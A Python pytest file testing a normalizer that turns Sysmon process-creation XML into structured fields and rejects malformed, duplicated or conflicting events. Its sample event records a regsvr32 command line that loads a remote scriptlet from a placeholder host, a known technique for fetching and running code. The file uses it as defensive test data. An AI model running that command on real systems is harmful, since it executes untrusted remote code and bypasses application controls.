"""Native Sysmon1v5 shape, precise source identity and atomic CLI output checks."""
import json
from pathlib import Path
import subprocess
import sys
import xml.etree.ElementTree as ET

import pytest

from tools.normalize_windows_process import normalize_event


ROOT = Path(__file__).resolve().parents[1]
NATIVE = ROOT / "tests/fixtures/process/native"
XML = (NATIVE / "process-create-v5.xml").read_text()
BENIGN = (NATIVE / "benign-process-v5.xml").read_text()
GUID = "a1b2c3d4-1111-2222-3333-444455556666"
PARENT_GUID = "a1b2c3d4-7777-8888-9999-aaaabbbbcccc"


def field_xml(xml, name, value):
    root = ET.fromstring(xml)
    container = root.find("{*}EventData")
    field = container.find(f"{{*}}Data[@Name='{name}']")
    assert field is not None
    if value is None:
        container.remove(field)
    else:
        field.text = value
    return ET.tostring(root, encoding="unicode")


def test_native_fields_map_to_process_identity_and_opaque_command_text():
    event = normalize_event(XML)
    assert event["event.dataset"] == "windows.sysmon.process"
    assert event["event.code"] == "1" and event["event.version"] == 5
    assert event["event.provider"] == "Microsoft-Windows-Sysmon"
    assert event["event.channel"] == "Microsoft-Windows-Sysmon/Operational"
    assert event["host.name"] == "ws01.lab.example"
    assert event["event.record_id"] == "2001"
    assert event["process.guid"] == GUID and event["process.parent.guid"] == PARENT_GUID
    assert event["process.executable"] == r"C:\Windows\System32\regsvr32.exe"
    assert event["process.parent.executable"] == r"C:\Windows\System32\cmd.exe"
    assert event["process.pid"] == 4100 and event["process.parent.pid"] == 4000
    assert event["process.command_line"] == (
        r"C:\Windows\System32\regsvr32.exe /s /n /u /i:https://example.invalid/demo.sct scrobj.dll")
    assert event["user.name"] == r"LAB\operator"
    assert event["event.id"] == "windows-sysmon:6ea7bbc546ea8884cf18ffaae4ea54d8944e70404df89b2eabd6febace292c50"
    assert normalize_event(BENIGN)["process.executable"].endswith(r"\notepad.exe")


def test_commandline_spacing_and_tabs_are_preserved_by_native_reader():
    value = " \tREGSVR32.EXE\t/s  "
    assert normalize_event(field_xml(XML, "CommandLine", value))["process.command_line"] == value


@pytest.mark.parametrize("name", ["ProcessGuid", "ParentProcessGuid", "Image", "ParentImage", "CommandLine"])
def test_required_native_fields_cannot_be_substituted_by_pid_or_other_context(name):
    for value in (None, "", "-", "   "):
        with pytest.raises(ValueError):
            normalize_event(field_xml(XML, name, value))


@pytest.mark.parametrize("name,target", [
    ("ProcessId", "process.pid"), ("ParentProcessId", "process.parent.pid"), ("User", "user.name"),
])
def test_missing_optional_context_is_omitted(name, target):
    for value in (None, "", "-"):
        result = normalize_event(field_xml(XML, name, value))
        assert target not in result
        assert result["process.guid"] == GUID


def test_case_guid_braces_numeric_padding_and_timezone_normalize_to_same_event():
    variant = XML.replace("WS01.LAB.EXAMPLE", "ws01.lab.example").replace(
        ">2001<", ">0002001<").replace("2026-01-01T00:00:10.1234567Z", "2026-01-01T03:00:10.1234567+03:00")
    variant = field_xml(variant, "ProcessGuid", GUID)
    variant = field_xml(variant, "ParentProcessGuid", PARENT_GUID)
    variant = field_xml(variant, "ProcessId", "0004100")
    assert normalize_event(variant) == normalize_event(XML)


def test_system_time_is_authoritative_and_100ns_is_retained_in_identity():
    first = normalize_event(XML)
    second = normalize_event(XML.replace(".1234567Z", ".1234568Z"))
    assert first["@timestamp"] == second["@timestamp"] == "2026-01-01T00:00:10.123456Z"
    assert first["win.timestamp_remainder"] == 7 and second["win.timestamp_remainder"] == 8
    assert first["event.id"] != second["event.id"]
    assert normalize_event(field_xml(XML, "UtcTime", "2000-01-01 00:00:00.000")) == first
    assert normalize_event(field_xml(XML, "UtcTime", None)) == first
    for old, new in ((">2001<", ">2002<"), ("WS01", "WS02"), ("2026-01-01T", "2026-01-02T")):
        assert normalize_event(XML.replace(old, new))["event.id"] != first["event.id"]


@pytest.mark.parametrize("value,expected,remainder", [
    ("2026-01-01T00:00:10Z", "2026-01-01T00:00:10Z", 0),
    ("2026-01-01T00:00:10.1Z", "2026-01-01T00:00:10.100000Z", 0),
    ("2026-01-01T00:00:10.0000001Z", "2026-01-01T00:00:10Z", 1),
])
def test_fractional_renderings_are_exact(value, expected, remainder):
    result = normalize_event(XML.replace("2026-01-01T00:00:10.1234567Z", value))
    assert result["@timestamp"] == expected and result["win.timestamp_remainder"] == remainder


@pytest.mark.parametrize("field,value", [
    ("Image", "C:\\Tools\\regſvr32.exe"), ("ParentImage", "C:\\工具\\cmd.exe"),
    ("CommandLine", "regsvr32.exe /i:é"), ("CommandLine", "regsvr32.exe\n/s"),
    ("Image", r"C:\Tools\NUL.exe"), ("Image", r"C:\Tools\regsvr32.exe:stream"),
    ("ParentImage", r"\\server\share\cmd.exe"),
    ("ProcessGuid", "00000000-0000-0000-0000-000000000000"),
    ("ParentProcessGuid", "4000"), ("ProcessGuid", " " + GUID),
    ("ProcessId", "4294967296"), ("ParentProcessId", "-1"),
    ("ProcessId", "0x10"), ("ProcessId", "١٦"), ("ProcessId", "1.0"),
])
def test_unsupported_native_values_fail_without_repair_or_benign_classification(field, value):
    with pytest.raises(ValueError):
        normalize_event(field_xml(XML, field, value))


def test_numeric_padding_is_bounded_before_integer_conversion():
    assert normalize_event(field_xml(XML, "ProcessId", "0" * 5000 + "4100"))["process.pid"] == 4100
    with pytest.raises(ValueError):
        normalize_event(field_xml(XML, "ProcessId", "1" * 5000))


@pytest.mark.parametrize("old,new", [
    (">1</EventID>", ">10</EventID>"), (">5</Version>", ">4</Version>"),
    (">5</Version>", ">05</Version>"), ("Microsoft-Windows-Sysmon\"", "Other-Provider\""),
    ("Microsoft-Windows-Sysmon/Operational", "Security"),
    (">2001<", ">18446744073709551616<"), (">WS01.LAB.EXAMPLE<", ">-<"),
    ("2026-01-01T00:00:10.1234567Z", "2026-01-01T00:00:10.12345678Z"),
    ("2026-01-01T00:00:10.1234567Z", "2026-01-01T00:00:10"),
    ("2026-01-01T00:00:10.1234567Z", "2026-01-01T00:00:10+03:60"),
    ("2026-01-01T00:00:10.1234567Z", "1969-12-31T23:59:59Z"),
])
def test_native_source_and_timestamp_metadata_are_exact(old, new):
    assert old in XML
    with pytest.raises(ValueError):
        normalize_event(XML.replace(old, new))


@pytest.mark.parametrize("extra,position", [
    ("<System/>", "</System>"), ("<EventData/>", "</EventData>"),
    ("<Version>5</Version>", "</System>"), ("<Level>4</Level>", "</System>"),
    ('<TimeCreated SystemTime="2026-01-01T00:00:00Z"/>', "</System>"),
    ('<Data Name="Image">C:\\Other.exe</Data>', "</EventData>"),
    ('<Data Name="Bad"><Child/></Data>', "</EventData>"),
    ('<Data Name=" Image">C:\\Other.exe</Data>', "</EventData>"),
    ("<Data>unnamed</Data>", "</EventData>"), ("<Other/>", "</EventData>"),
    ("<Unknown><Child/></Unknown>", "</System>"),
])
def test_duplicate_or_nested_xml_evidence_is_rejected(extra, position):
    replacement = position + extra if extra in {"<System/>", "<EventData/>"} else extra + position
    with pytest.raises(ValueError):
        normalize_event(XML.replace(position, replacement))


def test_entities_wrapped_root_wrong_namespace_and_other_containers_are_rejected():
    variants = [
        '<!DOCTYPE Event [<!ENTITY payload "x">]>' + XML,
        "<Events>" + XML + "</Events>",
        XML.replace(' xmlns="http://schemas.microsoft.com/win/2004/08/events/event"', ""),
        XML.replace("</Event>", "<Other/></Event>"),
    ]
    for value in variants:
        with pytest.raises(ValueError):
            normalize_event(value)


def test_unknown_scalar_native_fields_are_not_exported_as_verified_enrichment():
    original = normalize_event(XML)
    assert normalize_event(field_xml(XML, "OriginalFileName", "OTHER.EXE")) == original
    assert "OriginalFileName" not in original
    assert "process.parent.command_line" not in original


def test_cli_works_outside_repo_deduplicates_and_withholds_all_output_on_bad_batch(tmp_path):
    script = ROOT / "tools/normalize_windows_process.py"
    good = NATIVE / "process-create-v5.xml"
    result = subprocess.run([sys.executable, str(script), str(good), str(good)],
                            cwd=tmp_path, capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
    assert [json.loads(line) for line in result.stdout.splitlines()] == [normalize_event(XML)]
    bad = tmp_path / "bad.xml"
    bad.write_text(field_xml(XML, "CommandLine", ""))
    result = subprocess.run([sys.executable, str(script), str(good), str(bad)],
                            cwd=tmp_path, capture_output=True, text=True)
    assert result.returncode == 1 and result.stdout == ""
    assert "normalization failed" in result.stderr


def test_cli_rejects_conflicting_record_payload_before_stdout(tmp_path):
    changed = tmp_path / "changed.xml"
    changed.write_text(field_xml(XML, "CommandLine", "notepad.exe"))
    result = subprocess.run([
        sys.executable, str(ROOT / "tools/normalize_windows_process.py"),
        str(NATIVE / "process-create-v5.xml"), str(changed),
    ], cwd=tmp_path, capture_output=True, text=True)
    assert result.returncode == 1 and result.stdout == ""
    assert "conflicting duplicate" in result.stderr
